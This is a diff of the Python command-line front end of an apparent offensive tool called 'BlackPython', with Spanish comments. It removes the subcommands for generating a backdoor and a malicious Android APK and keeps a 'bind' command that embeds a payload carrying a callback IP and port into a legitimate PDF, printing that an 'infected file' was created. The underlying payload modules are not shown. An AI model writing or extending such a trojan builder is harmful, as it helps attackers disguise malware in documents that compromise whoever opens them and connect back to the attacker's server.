@@ -1,65 +1,44 @@
 import os
 import sys
-from core.backdoor import Backdoor
-from core.android import AndroidPayload
 from core.binder import FileBinder
+from core.backdoor import Backdoor
 import argparse
 
 def main():
-    parser = argparse.ArgumentParser(description="BlackPython - Herramienta de Red Team")
+    parser = argparse.ArgumentParser(description="Herramienta de Red Team")
     subparsers = parser.add_subparsers(dest="command", required=True)
 
-    # Backdoor
-    backdoor_parser = subparsers.add_parser("backdoor", help="Genera un backdoor")
-    backdoor_parser.add_argument("--host", required=True, help="IP o dominio del C2")
-    backdoor_parser.add_argument("--port", type=int, default=4444, help="Puerto del C2")
-
-    # Android APK
-    android_parser = subparsers.add_parser("android", help="Genera un APK malicioso")
-    android_parser.add_argument("--lhost", required=True, help="Host para conexión reversa")
-    android_parser.add_argument("--lport", type=int, default=4444, help="Puerto para conexión")
-
-    # Binder mejorado
-    binder_parser = subparsers.add_parser("bind", help="Camufla un payload en un archivo")
-    binder_parser.add_argument("--file", required=True, help="Archivo legítimo (PDF, PNG, JPG)")
-    binder_parser.add_argument("--payload", required=True, help="Script malicioso a incrustar")
-    binder_parser.add_argument("--output", required=True, help="Archivo de salida")
-    binder_parser.add_argument("--ip", required=True, help="IP para reemplazar en el payload")
-    binder_parser.add_argument("--port", type=int, required=True, help="Puerto para reemplazar en el payload")
-    binder_parser.add_argument("--debug", action="store_true", help="Modo verbose")
+    # Parser para 'bind'
+    bind_parser = subparsers.add_parser("bind", help="Bind payload a archivo")
+    bind_parser.add_argument("--file", required=True, help="Archivo original")
+    bind_parser.add_argument("--payload", required=True, help="Payload a incrustar")
+    bind_parser.add_argument("--output", required=True, help="Archivo de salida")
+    bind_parser.add_argument("--ip", required=True, help="IP para conexión")
+    bind_parser.add_argument("--port", type=int, required=True, help="Puerto para conexión")
+    bind_parser.add_argument("--debug", action="store_true", help="Modo verbose")
 
     args = parser.parse_args()
 
-    if args.command == "backdoor":
-        Backdoor(args.host, args.port).run()
-    elif args.command == "android":
-        AndroidPayload(args.lhost, args.lport).generate_apk()
-    elif args.command == "bind":
+    if args.command == "bind":
         try:
-            if args.debug:
-                print(f"[DEBUG] Leyendo payload desde: {args.payload}")
-                
-            with open(args.payload, 'r') as f:
-                payload_content = f.read()
-                
-            payload_content = payload_content.replace("TU_IP_AQUÍ", args.ip)
-            payload_content = payload_content.replace("4444", str(args.port))
+            # Validar que los archivos existen
+            if not os.path.isfile(args.file):
+                raise FileNotFoundError(f"No existe el archivo: {args.file}")
+            if not os.path.isfile(args.payload):
+                raise FileNotFoundError(f"No existe el payload: {args.payload}")
 
-            if args.debug:
-                print(f"[DEBUG] Payload modificado (primeras 100 chars):\n{payload_content[:100]}...")
-                print(f"[DEBUG] Tipo de archivo de entrada: {args.file.split('.')[-1]}")
-
+            # Lógica de binding
             if args.file.endswith(".pdf"):
-                FileBinder.bind_to_pdf(args.file, payload_content, args.output, args.debug)
+                # Pasar el path del payload directamente, no su contenido
+                success = FileBinder.bind_to_pdf(args.file, args.payload, args.output, args.debug)
+                if success:
+                    print(f"[+] Archivo infectado creado en: {args.output}")
+                else:
+                    raise RuntimeError("No se pudo crear el archivo infectado")
             elif args.file.endswith((".png", ".jpg")):
-                FileBinder.bind_to_image(args.file, payload_content, args.output, args.debug)
+                raise NotImplementedError("Soporte para imágenes no implementado")
             else:
-                raise ValueError("Formato de archivo no soportado")
-
-            if args.debug:
-                print(f"[SUCCESS] Archivo infectado creado en: {args.output}")
-                print(f"Tamaño original: {os.path.getsize(args.file)} bytes")
-                print(f"Tamaño infectado: {os.path.getsize(args.output)} bytes")
+                raise ValueError("Formato no soportado")
 
         except Exception as e:
             print(f"[ERROR] {str(e)}", file=sys.stderr)
